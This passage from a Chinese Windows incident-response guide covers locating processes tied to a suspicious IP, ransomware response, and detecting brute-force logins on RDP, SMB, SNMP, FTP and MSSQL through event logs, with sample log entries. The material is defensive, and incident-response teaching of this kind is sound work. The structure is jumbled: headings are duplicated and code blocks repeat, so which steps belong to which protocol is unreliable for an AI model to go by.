if exist "%USERPROFILE%/Desktop/bat_result.txt" (
    echo "find it!!!"
    timeout /T 5 /NOBREAK
    goto loop
) else (
for /f "tokens=5" %%a in ('netstat /ano ^| findstr 123.123.123.123') do (
wmic process where processid=%%a get name,executablepath,processid,CommandLine >> %USERPROFILE%/Desktop/bat_result.txt
)

timeout /T 1 /NOBREAK
)

goto loop

```

### 5. Process Hacker

也可以通过右键的方式来查看

### 5. System Informer

### 6. 内存搜索关键字

将已获取的域名、IP等作为关键字，使用僵尸网络查杀工具在内存中进行搜索

成功发现恶意程序

具体使用方法见 小技巧 -> 0x03 内存中搜索字符串

### 6. OpenArk

### 6. System Informer

也可以通过右键进行查看

### 7. 获取异常文件的时间信息

文件浏览器

`Process Explorer`

### 7. OpenArk

https://openark.blackint3.com/

https://github.com/BlackINT3/OpenArk

OpenArk 也是一款集成性的安全排查工具，用于对抗 `Rootkit`

可以查看属性

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 7. 勒索病毒

> 原文：https://books.noptrace.com/windows/6.%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/

### 0x00 简述

勒索病毒是让人比较无奈的恶意程序，大部分都是只有攻击者才能解密

近期和一些勒索解密团队合作后发现，其实还是有解密的可能的，是否能够解密，如何判断需要专业团队来完成

但还是那句话，把应急解密或者赎金的钱用在数据备份、安全防护上才是较为明智的选择

### 0x01 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x02 确定勒索病毒家族

判断勒索病毒家族并不难，可以从以下几个方面获取

 - 勒索页面主动说明的，直接粘贴到 Baidu、Google 里面搜索
 - 勒索加密文件的后缀名
 - 联系邮箱

### 0x03 根据勒索病毒类型寻找解决方法

- 深信服EDR
 - 360安全卫士-勒索病毒解密
 - The No More Ransom Project
 - 腾讯电脑管家-勒索病毒搜索引擎
 - VenusEye勒索病毒搜索引擎
 - 奇安信-勒索病毒搜索引擎
 - 腾讯哈勃勒索病毒安全工具
 - 瑞星防勒索病毒专题
 - 卡巴斯基勒索软件解密器
 - ID Ransomware
 - GitHub
 - 淘宝、闲鱼
 - ...

### 0x04 寻找加密器

如果没有找到现成的解决办法，又不想冒险交赎金来解密的话，就只能通过找加密器和加密命令来分析解密方法了

寻找加密器并不简单，时间线是一个很重要的线索，其次是勒索病毒一般不会加密自己的加密器

### 0x05 解决勒索

如果通过公开途径或者交赎金的方式获取到了解密工具，一定要先测试好，免得遇到二次加密

如果是安全人员逆向分析，找到了破解方法，也建议对已经被加密的文件备份一份，免得解密过程中出现bug导致文件丢失

除了恢复被勒索系统以外，找到被勒索的原因是最重要的，如果由于缺少流量、日志等记录，无法还原，至少要做到以下几点

 - 将应用程序及系统升级、打上最新的安全补丁
 - 对于本次受到影响的系统进行重点备份

### 0x06 善后阶段

直接查看善后阶段即可，主要为定损以及针对性排查处理，目的是解决潜在的受害服务器

### 0x07 常规安全检查阶段

直接根据常规安全检查章节进行安全检查即可，目的是找出当前系统中存在的隐藏后门等

### 1. 确定加密时间

使用 Everything 等程序，搜索被加密后的文件的后缀，对加密后的文件进行时间排序，很容易确定加密开始的时间

这里需要注意，部分加密程序可能会对部分空文件或者特殊格式的文件仅重命名，所以需要人工鉴别来确定时间

### 2. 查找加密开始前的活动

一方面是通过 everything 等来查看加密开始前创建文件的情况

另一方面是通过各种缓存等文件，查看近期文件执行情况，具体参照 常规安全检查 -> 0x01 近期活动 章节

### 3. 对加密器逆向分析

这部分需要具备逆向分析的能力，如果公司内部安全人员不具备，建议向专业的逆向分析人员求助

如果是单文件加密器，没有额外参数，分析起来可能比较容易

如果是单文件加密器有额外参数或者多文件加密器（证书或者公钥文件），则需要获取相关参数或文件才能进行分析，这种也是比较主流的

如果能获取到恶意程序原程序，也就是说执行该程序会从网络下载加密器并执行或者该恶意程序会自己释放加密器并执行，可以在隔离的测试环境，通过火绒剑等对恶意程序的执行过程进行监控，获取有效的加密器以及启动参数，进一步进行分析

### 系统快照

这种主要是云环境或虚拟化环境比较方便，目前似乎这类方式取证出来的内容都会丢失内存信息，属于是关机-快照-导出

虚拟机软件似乎支持例如暂停、冻结等功能，具体根据实际情况决定

### 磁盘取证

磁盘取证有很多工具可以考虑

 - `dd`
 - `FTK Imager`

### 针对性取证

这部分推荐我们自己的 NOPTrace-Collector

https://github.com/Just-Hack-For-Fun/NOPTrace-Collector

我们还推出了一套数字取证和应急响应规范，可以根据此规范自己开发取证程序

https://github.com/Just-Hack-For-Fun/OpenForensicRules

### 内存取证

- `DumpIt`
 - `FTK Imager`

 取证后，对证据进行分析时，需要先单独复制一份，保持所有安全人员分析的基础是相同的

## 8. 暴力破解

> 原文：https://books.noptrace.com/windows/7.%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/

### 0x00 固定证据

在发生任何安全事件时，确定安全事件真实存在以后，第一步都建议固定证据，固定证据一般有以下几种类型，受害单位可以根据实际需求选择

 - 系统快照 - 一般云环境比较方便这么做
 - 磁盘取证
 - 针对性取证 - 例如日志文件、网络信息、数据库等
 - 内存取证

### 0x01 暴力破解类型

暴力破解攻击主要针对

 - RDP
 - SMB
 - SNMP
 - SQL Server
 - FTP

 Windows 应急响应过程中经常通过 netstat 查看网络连接情况，这里需要注意，如果一个连接没有建立成功或者完成，可能是不会显示在 netstat 中的，这一点在暴力破解排查过程中尤为显著

### 0x02 RDP 暴力破解

### 0x03 SMB 暴力破解

### 0x04 SNMP 暴力破解

SNMP 消息传输通过 UDP 协议，常用端口为 161 和 162， 主要是 161

SNMP协议相关的内容命名是最让我不理解的，不过不影响我们做应急响应排查，我只是表达不理解

### 0x05 FTP 暴力破解

Windows Server 2016 中，FTP服务是 IIS 服务器安装过程中的一个角色服务，文章中以自带的这个 FTP 为例

### 0x06 MSSQL 暴力破解

这里以 MSSQL 2016 版本为例

安装过程中会设置身份验证方式

### 1. 网络分析

### 1) netstat

`netstat -ano | findstr "端口"

```
 `netstat` 这个命令结果和标题栏对应关系没有 `Sysinternals Suite` 中其他工具那么好，但是还是能看出 `pid` 的位置

### 1) netstat

`netstat -ano | findstr "端口"

```
 `netstat` 这个命令结果和标题栏对应关系没有 `Sysinternals Suite` 中其他工具那么好，但是还是能看出 `pid` 的位置

### 1) netstat

`netstat -ano | findstr "端口"

```
 `netstat` 这个命令结果和标题栏对应关系没有 `Sysinternals Suite` 中其他工具那么好，但是还是能看出 `pid` 的位置

### 1) netstat

`netstat -ano | findstr "端口"

```
 `netstat` 这个命令结果和标题栏对应关系没有 `Sysinternals Suite` 中其他工具那么好，但是还是能看出 `pid` 的位置

### 1) netstat

`netstat -ano | findstr "端口"

```
 `netstat` 这个命令结果和标题栏对应关系没有 `Sysinternals Suite` 中其他工具那么好，但是还是能看出 `pid` 的位置

### 1) 查询可登录系统的账号

- `Administrators` 组内账号
 - `Remote Desktop Users` 组内账号
 - 减去 `拒绝通过远程桌面服务登录` 组策略内的账号和组

 详情参考知识点附录 -> 0x01 谁可以使用远程桌面服务

### 1. 网络分析

### 1) 查询可登录系统的账号

- 服务器上的用户
 - 减去 `拒绝从网络访问这台计算机` 组策略内的账号和组(默认禁止 `Guest`)

### 1. 网络分析

### 1) 查询可登录系统的账号(团体名)

【`注册表`】

 `reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities"

```

【`服务`】

搜索服务，之后按照图中内容选择

找到 `SNMP Service` ,双击即可打开属性配置窗口

切换到安全栏

在 `接受的社区名称(N)` 中配置的就是可以登录的团体名以及权限

Windows Server 2016 中如果不配置，是没有默认的团体名的

### 1. 网络分析

### 1) 查询可登录系统的账号

如果开启匿名身份验证，则可以匿名登录，否则只有系统上的用户账号可以登录（当然，这里是可以配置验证身份的程序的）

### 1. 网络分析

### 1) 查询可登录系统的账号

如果之前设置的只有 `Windows`身份验证模式，那么就只有 `MSSQL` 所在的操作系统上的用户在这个系统上使用程序连接 `MSSQL`

如果是混合模式，那至少有一个名为 `sa` 的账户，可以使用 `SQL` 查询数据库中可登录的账户

 `SELECT name
FROM sys.sql_logins
WHERE is_disabled = 0;

```

### 2. 登录分析

### 2) Powershell

`Get-NetTCPConnection
Get-NetUDPEndpoint

```

### 2) Powershell

`Get-NetTCPConnection
Get-NetUDPEndpoint

```

### 2) Powershell

`Get-NetTCPConnection
Get-NetUDPEndpoint

```

### 2) Powershell

`Get-NetTCPConnection
Get-NetUDPEndpoint

```

### 2) Powershell

`Get-NetTCPConnection
Get-NetUDPEndpoint

```

### 2) 查询当前系统登录情况

【任务管理器】

信息不够详细，例如登录事件没有显示

【`cmd/PowerShell`】

 `query user

```

相对来说较为详细

在 Windows Server 2016 中 `query user` 是可以看到 `test$` 这种隐藏账户的

### 2. 登录分析

### 2) 查询当前系统登录情况

【`cmd`】

 `net session

```

【`Powershell`】

 `Get-SmbSession

```

### 2. 登录分析

### 2) 查询当前系统登录情况

`SNMP` 主要用于收集和传输网络设备的管理信息，例如设备的状态、性能指标和配置信息等。它通过查询和陷阱机制来获取和报告这些信息，而不涉及用户身份验证和登录会话。

### 2. 登录分析

### 2) 查询当前系统登录情况

Windows 这点很好，可以直接图形化观看

搜索 `IIS` ，按图选择

在网站上左侧找到建立的 `ftp` 站点，点击 `FTP 当前会话`

可以看到当前登录的用户信息，包括用户名、IP、时间、操作等

### 2. 登录分析

### 2) 查询当前系统登录情况

还是通过 `SQL` 语句来完成

 `SELECT login_name, session_id, login_time, host_name, program_name
FROM sys.dm_exec_sessions
WHERE is_user_process = 1;

```

可以看到 `helper` 账户就是通过 `Windows`身份验证方式登录的，而 `sa` 是通过 `SQL Server` 身份验证方式登录的

### 3) 图形化工具

如果此时正在被暴力破解，应该会出现较多与 `RDP` 服务端口(默认3389)的连接

通过网络信息可以获取到攻击者IP信息，进而排查该攻击者的行为

### 3) 查看最近登录情况

查看近期登录情况需要查看登录日志

 - 打开事件查看器，可以通过在开始菜单中搜索 `事件查看器` 或运行命令 `eventvwr.msc` 来打开它。
 - 在事件查看器窗口中，导航到 `Windows 日志` > `安全`。
 - 在右侧窗格中，你将看到列出的安全事件日志。
 - 在过滤器中，选择 "筛选当前日志"。
 - 在事件 `ID` 输入框中输入 `4624`，这是与用户登录相关的事件 `ID`。
 - 单击 "确定" 按钮，将仅显示与用户登录相关的事件日志。
 - 其中登录类型为 `10` 的日志即为通过 `RDP` 登录的数据包

 `win + r` 输入 `eventvwr.msc` 打开事件查看器

如果一个一个点开看比较麻烦，既然我们想知道的是近期哪个用户登录成功了，可以在标题上右键，筛选显示的列

不过很遗憾，Windows 的记录中，登录记录并没有把登录用户名放在用户这一栏

随意点开一个

可以看到，这里的标题中，没有显示登录用户的用户名的地方，所以默认情况只能一个一个点开看了

注意 `4624` 筛选的都是登录成功的日志(包括本地登录、RDP、SMB等)

所以这个步骤的意义在于将登录日志中的时间和用户名与运维开发等相关人员确定，是否为正常登录，否则可能是暴力破解成功或者其他方式攻击者登录

通过 `RDP` 进行登录并退出，共产生 5 个 `4624` 的记录

这里挑选我们想看的那一个给大家看一下

 `日志名称:          Security
来源:            Microsoft-Windows-Security-Auditing
日期:            2023/12/28 1:30:43
事件 ID:         4624
任务类别:          登录
级别:            信息
关键字:           审核成功
用户:            暂缺
计算机:           HELPER4A5F
描述:
已成功登录帐户。

使用者:
    安全 ID:      SYSTEM
    帐户名称:       HELPER4A5F$
    帐户域:        WORKGROUP
    登录 ID:      0x3E7

登录信息:
    登录类型:       10
    受限制的管理员模式:  否
    虚拟帐户:       否
    提升的令牌:      否

模拟级别:       模拟

新登录:
    安全 ID:      HELPER4A5F\remotetest
    帐户名称:       remotetest
    帐户域:        HELPER4A5F
    登录 ID:      0xC5A55F
    链接的登录 ID:       0x0
    网络帐户名称: -
    网络帐户域:  -
    登录 GUID:        {00000000-0000-0000-0000-000000000000}

进程信息:
    进程 ID:      0x3c8
    进程名称:       C:\Windows\System32\svchost.exe

网络信息:
    工作站名称:  HELPER4A5F
    源网络地址:  10.211.55.2
    源端口:        0

详细的身份验证信息:
    登录进程:       User32
    身份验证数据包:    Negotiate
    传递的服务:  -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

创建登录会话时，将在被访问的计算机上生成此事件。

“使用者”字段指示本地系统上请求登录的帐户。这通常是一个服务(例如 Server 服务)或本地进程(例如 Winlogon.exe 或 Services.exe)。

“登录类型”字段指示发生的登录类型。最常见的类型是 2 (交互式)和 3 (网络)。

“新登录”字段指示新登录是为哪个帐户创建的，即已登录的帐户。

“网络”字段指示远程登录请求源自哪里。“工作站名称”并非始终可用，并且在某些情况下可能会留空。

“模拟级别”字段指示登录会话中的进程可以模拟到的程度。

“身份验证信息”字段提供有关此特定登录请求的详细信息。
    - “登录 GUID”是可用于将此事件与 KDC 事件关联起来的唯一标识符。
    -“传递的服务”指示哪些中间服务参与了此登录请求。
    -“数据包名”指示在 NTLM 协议中使用了哪些子协议。
    -“密钥长度”指示生成的会话密钥的长度。如果没有请求会话密钥，则此字段将为 0。

```
 这里信息很详细，包括账号、时间、登录方式、来源IP等

### 3. 日志分析

匿名登录成功的日志如下

 `#Software: Microsoft Internet Information Services 10.0
#Version: 1.0
#Date: 2023-12-29 06:27:23
#Fields: date time c-ip cs-username s-ip s-port cs-method cs-uri-stem sc-status sc-win32-status sc-substatus x-session x-fullpath
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 ControlChannelOpened - - 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 USER anonymous 331 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 PASS IEUser@ 230 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea /
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 opts utf8+on 200 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 PWD - 257 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 CWD / 250 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea /
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 TYPE A 200 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 PASV - 227 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 49906 DataChannelOpened - - 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 49906 DataChannelClosed - - 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea -
2023-12-29 06:27:23 10.211.55.53 - 10.211.55.52 21 LIST - 226 0 0 2cf9cd35-e364-4b1a-ab27-fe9050daa5ea /

```
 解析如下：

 - 建立通道
 - 设置账户为匿名账户  `anonymous`
 - 设置密码为 `IEUser@`
 - 登录成功
 - 设置 `UTF-8` 格式
 - 打印当前路径
 - 改变当前路径为 `/`
 - 设置传输类型为 `Ascii` 模式
 - 启动被动模式 （`PASV`模式允许客户端在数据传输之前向服务器请求打开一个被动的数据连接）
 - 数据通道打开
 - 数据通道关闭
 - 列出指定目录下的文件和子目录

 由于在 `ftp` 目录下没有设置文件，所以看起来比较空，我们创建一个文件夹 `success` ，并在里面放入文本文件`demo.txt` ，内容为 `abc`

关闭匿名登录，使用正确的账户密码进行登录

 `2023-12-29 07:56:21 10.211.55.53 - 10.211.55.52 21 ControlChannelOpened - - 0 0 28b55545-2e87-4a01-83b6-1964f6d931e2 -
2023-12-29 07:56:21 10.211.55.53 - 10.211.55.52 21 USER anonymous 331 0 0 28b55545-2e87-4a01-83b6-1964f6d931e2 -
2023-12-29 07:56:21 10.211.55.53 - 10.211.55.52 21 PASS IEUser@ 530 1326 42 28b55545-2e87-4a01-83b6-1964f6d931e2 -
2023-12-29 07:56:21 10.211.55.53 - 10.211.55.52 21 ControlChannelClosed - - 0 0 28b55545-2e87-4a01-83b6-1964f6d931e2 -
2023-12-29 07:56:27 10.211.55.53 - 10.211.55.52 21 ControlChannelOpened - - 0 0 dc0d944f-3219-44b7-919c-8da320554ea7 -
2023-12-29 07:56:27 10.211.55.53 - 10.211.55.52 21 USER demo 331 0 0 dc0d944f-3219-44b7-919c-8da320554ea7 -
2023-12-29 07:56:27 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 PASS *** 230 0 0 dc0d944f-3219-44b7-919c-8da320554ea7 /
2023-12-29 07:56:27 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 opts utf8+on 200 0 0 dc0d944f-3219-44b7-919c-8da320554ea7 -
2023-12-29 07:56:27 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 PWD - 257 0 0 dc0d944f-3219-44b7-919c-8da320554ea7 -
2023-12-29 07:56:27 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 ControlChannelClosed - - 0 0 dc0d944f-3219-44b7-919c-8da320554ea7 -

```
 我使用的是 `Windows` 的文件浏览器进行访问的，它默认会以匿名账户进行登录尝试，如果登录不上去，则会弹出密码验证页面

接下来打开 `success` 文件夹，下载 `demo.txt`

 `2023-12-29 08:01:24 10.211.55.53 - 10.211.55.52 21 ControlChannelOpened - - 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 - 10.211.55.52 21 USER demo 331 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 PASS *** 230 0 0 a7a1e257-031a-4565-a980-d046ace326fb /
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 opts utf8+on 200 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 PWD - 257 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 CWD /success/ 250 0 0 a7a1e257-031a-4565-a980-d046ace326fb /success
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 TYPE I 200 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 PASV - 227 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 49988 DataChannelOpened - - 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 SIZE demo.txt 213 0 0 a7a1e257-031a-4565-a980-d046ace326fb /success/demo.txt
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 49988 DataChannelClosed - - 0 0 a7a1e257-031a-4565-a980-d046ace326fb -
2023-12-29 08:01:24 10.211.55.53 HELPER4A5F\demo 10.211.55.52 21 RETR demo.txt 226 0 0 a7a1e257-031a-4565-a980-d046ace326fb /success/demo.txt

```
 尝试使用错误的密码进行登录

 `2023-12-29 08:11:51 10.211.55.53 - 10.211.55.52 21 ControlChannelOpened - - 0 0 59aec49f-3f2b-4057-8297-a6bfe096d8e6 -
2023-12-29 08:11:51 10.211.55.53 - 10.211.55.52 21 USER anonymous 331 0 0 59aec49f-3f2b-4057-8297-a6bfe096d8e6 -
2023-12-29 08:11:51 10.211.55.53 - 10.211.55.52 21 PASS IEUser@ 530 1326 42 59aec49f-3f2b-4057-8297-a6bfe096d8e6 -
2023-12-29 08:11:51 10.211.55.53 - 10.211.55.52 21 ControlChannelClosed - - 0 0 59aec49f-3f2b-4057-8297-a6bfe096d8e6 -
2023-12-29 08:11:55 10.211.55.53 - 10.211.55.52 21 ControlChannelOpened - - 0 0 bf304234-f27d-4562-ad02-12a82db1305f -
2023-12-29 08:11:55 10.211.55.53 - 10.211.55.52 21 USER demo 331 0 0 bf304234-f27d-4562-ad02-12a82db1305f -
2023-12-29 08:11:55 10.211.55.53 - 10.211.55.52 21 PASS *** 530 1326 41 bf304234-f27d-4562-ad02-12a82db1305f -
2023-12-29 08:11:55 10.211.55.53 - 10.211.55.52 21 ControlChannelClosed - - 0 0 bf304234-f27d-4562-ad02-12a82db1305f -

```
 除了文件浏览器自己尝试的匿名访问，可以看到就是账号密码,登录失败，比较简单，因此暴力破解部分，我们可以考虑将 `530` 作为筛选条件

尝试模拟暴力破解，从日志中进行筛选

 `type xxx.log | findstr /C:"#Fields" /C:"*** 530 "

```

如果想知道某个IP的话，可以再次筛选，当然可以通过更加智能的文本编辑器进行统计

### 3) 图形化工具

如果此时正在被暴力破解，应该会出现较多与 `MSSQL` 服务端口(默认`1433`)的连接

### 3) 查看最近登录情况

默认的情况下 `MSSQL 2016` 并不会记录登录成功的日志，包括通过 `Windows`身份验证方式登录的和通过 `SQL Server` 身份验证方式登录的

### 3. 日志分析

在 `SSMS (SQL Server Management Studio)` `sa` 连接 `MSSQL` 后，打开管理就可以看到 `SQL Server` 日志了

通过 `SQL Server`身份验证方式，错误的账户或密码登录记录的日志如下

 `12/29/2023 21:25:56,Logon,未知,Login failed for user 'sa'. 原因: 密码与所提供的登录名不匹配。 [客户端: 10.211.55.53]
12/29/2023 19:58:46,Logon,未知,Login failed for user 'demo'. 原因: 找不到与提供的名称匹配的登录名。 [客户端: 10.211.55.2]

```
 通过 `Windows` 身份验证方式登录的错误日志如下

 `12/29/2023 21:21:58,Logon,未知,Login failed. The login is from an untrusted domain and cannot be used with Windows authentication. [客户端: 10.211.55.53]

```
 日志记录了时间、用户名、源IP

通过筛选源为 `Logon` 可以筛选出全部的登录错误日志

可以很清晰看出暴力破解的痕迹，如果这个搜索你觉得不好用，还可以到处日志，之后通过文字编辑器工具进行排查

通过 `Windows` 身份验证方式登录 `MSSQL` 失败的日志还会记录在 `Windows` 的安全日志里

 `帐户登录失败。

使用者:
    安全 ID:      NULL SID
    帐户名:        -
    帐户域:        -
    登录 ID:      0x0

登录类型:           3

登录失败的帐户:
    安全 ID:      NULL SID
    帐户名:        join
    帐户域:        .

失败信息:
    失败原因:       未知用户名或密码错误。
    状态:         0xC000006D
    子状态:        0xC0000064

进程信息:
    调用方进程 ID:   0x0
    调用方进程名: -

网络信息:
    工作站名:   WINDOWS-11
    源网络地址:  10.211.55.53
    源端口:        50915

详细身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递服务:   -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

```
 登录类型也是 `3` ，不过很少见到通过这种方式暴力破解的

### 3. 日志分析

`RDP` 暴力破解肯定会造成非常多的登录错误日志

 - 打开事件查看器，可以通过在开始菜单中搜索 "事件查看器" 或运行命令 `eventvwr.msc` 来打开它。
 - 在事件查看器窗口中，导航到 "Windows 日志" > "安全"。
 - 在右侧窗格中，你将看到列出的安全事件日志。
 - 在过滤器中，选择 "筛选当前日志"。
 - 在 "事件 ID" 输入框中输入 "4625"，这是与用户登录失败相关的事件 ID。
 - 单击 "确定" 按钮，将仅显示与用户登录失败相关的事件日志。

 `帐户登录失败。

使用者:
    安全 ID:      NULL SID
    帐户名:        -
    帐户域:        -
    登录 ID:      0x0

登录类型:           3

登录失败的帐户:
    安全 ID:      NULL SID
    帐户名:        Administrator
    帐户域:

失败信息:
    失败原因:       未知用户名或密码错误。
    状态:         0xC000006D
    子状态:        0xC000006A

进程信息:
    调用方进程 ID:   0x0
    调用方进程名: -

网络信息:
    工作站名:   -
    源网络地址:  10.211.55.2
    源端口:        0

详细身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递服务:   -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

```
 在这些错误信息中可以获取到源IP、使用的用户名、登录的类型等信息

不要只看登录类型为 10 的日志，Windows Server 2016中RDP暴力破解（登录失败）事件ID为 4625，一般情况下登录类型为 3，这样就和 RDP 协议相同了

这里需要在上面的基础上重点关注源端口为 0 的日志

所以如果存在`RDP` 爆破，应该存在大量同时具备以下特征的日志

 - 事件 `ID` 为 `4625`
 - 登录类型为 `3`
 - 源端口为 `0`

 详细测试情况参考

知识点附录 -> 0x02 RDP爆破登录的日志情况

知识点附录 -> 0x03 RDP和SMB登录失败日志的区别

### 3) 图形化工具

如果此时正在被暴力破解，应该会出现较多与 `SMB` 服务端口(默认`445`)的连接，但是我发现 `SMB` 协议的爆破并不会显示在 `netstat -ano` 中，或者说我明知道这边在暴力破解，连续执行20次能看到一次有一个连接

具体原因不得而知，不过这个时候就得拿出 `Wireshark` 了

在 `Wireshark` 中，可以直观的看到暴力破解的数据流量包，尝试追踪流

这样可以看到暴力破解的详细过程，使用的账户是 `admin` 、源IP等

### 3) 查看最近登录情况

查看近期登录情况需要查看登录日志

 - 打开事件查看器，可以通过在开始菜单中搜索 "事件查看器" 或运行命令 `eventvwr.msc` 来打开它。
 - 在事件查看器窗口中，导航到 `Windows 日志` > `安全`。
 - 在右侧窗格中，你将看到列出的安全事件日志。
 - 在过滤器中，选择 "筛选当前日志"。
 - 在 事件 `ID` 输入框中输入 `4624`，这是与用户登录相关的事件 `ID`。
 - 单击 "确定" 按钮，将仅显示与用户登录相关的事件日志。
 - 其中登录类型为 `3` 的日志主要就是 `SMB` 登录日志

 `win + r` 输入 `eventvwr.msc` 打开事件查看器

 `已成功登录帐户。

使用者:
    安全 ID:      NULL SID
    帐户名称:       -
    帐户域:        -
    登录 ID:      0x0

登录信息:
    登录类型:       3
    受限制的管理员模式:  -
    虚拟帐户:       否
    提升的令牌:      否

模拟级别:       模拟

新登录:
    安全 ID:      HELPER4A5F\demo
    帐户名称:       demo
    帐户域:        HELPER4A5F
    登录 ID:      0x183F484
    链接的登录 ID:       0x0
    网络帐户名称: -
    网络帐户域:  -
    登录 GUID:        {00000000-0000-0000-0000-000000000000}

进程信息:
    进程 ID:      0x0
    进程名称:       -

网络信息:
    工作站名称:  WINDOWS-11
    源网络地址:  10.211.55.53
    源端口:        50828

详细的身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递的服务:  -
    数据包名(仅限 NTLM):  NTLM V2
    密钥长度:       128

```
 这里信息很详细，包括账号、时间、登录方式、来源IP等

### 3. 日志分析

尝试使用错误的账号密码登录 `SMB`

 `帐户登录失败。

使用者:
    安全 ID:      NULL SID
    帐户名:        -
    帐户域:        -
    登录 ID:      0x0

登录类型:           3

登录失败的帐户:
    安全 ID:      NULL SID
    帐户名:        demo
    帐户域:        10.211.55.52

失败信息:
    失败原因:       未知用户名或密码错误。
    状态:         0xC000006D
    子状态:        0xC000006A

进程信息:
    调用方进程 ID:   0x0
    调用方进程名: -

网络信息:
    工作站名:   WINDOWS-11
    源网络地址:  10.211.55.53
    源端口:        50840

详细身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递服务:   -
    数据包名(仅限 NTLM):  -
    密钥长度:       0

```
 源端口不为 0 ，这有点重要

尝试使用正确的用户名密码进行登录

事件`ID` `4624` 后会紧跟着一个 `4776`

 `已成功登录帐户。

使用者:
    安全 ID:      NULL SID
    帐户名称:       -
    帐户域:        -
    登录 ID:      0x0

登录信息:
    登录类型:       3
    受限制的管理员模式:  -
    虚拟帐户:       否
    提升的令牌:      否

模拟级别:       模拟

新登录:
    安全 ID:      HELPER4A5F\demo
    帐户名称:       demo
    帐户域:        HELPER4A5F
    登录 ID:      0x19F9594
    链接的登录 ID:       0x0
    网络帐户名称: -
    网络帐户域:  -
    登录 GUID:        {00000000-0000-0000-0000-000000000000}

进程信息:
    进程 ID:      0x0
    进程名称:       -

网络信息:
    工作站名称:  WINDOWS-11
    源网络地址:  10.211.55.53
    源端口:        50875

详细的身份验证信息:
    登录进程:       NtLmSsp
    身份验证数据包:    NTLM
    传递的服务:  -
    数据包名(仅限 NTLM):  NTLM V2
    密钥长度:       128

```
 如果出现暴力破解，日志情况应该是存在大量同时符合以下特征的日志

 - 事件`ID` 为 `4625`
 - 登录类型为 `3`
 - 源端口不为 `0`

### 3) 图形化工具

如果此时正在被暴力破解，应该会出现较多与 `SNMP` 服务端口(默认`161`)的连接

但是我发现 `SNMP` 协议的爆破并不会显示在 `netstat -ano` 中，或者说我明知道这边在暴力破解，连续执行20次能看到一次有一个连接

可能是暴力破解软件的请求并没有构成操作系统认为的完整请求吧，不过这个时候就得拿出 `Wireshark` 了

在 `Wireshark` 中，可以直观的看到暴力破解的数据流量包，尝试追踪流

`UDP` 协议追踪流似乎会将这些请求合在一个流里，可以相对全面地看到这些团体名

### 3) 查看最近登录情况

`SNMP` 的正常访问和使用错误团体名的访问默认情况下都不记录日志，所以还是建议通过流量设备查询相关情况

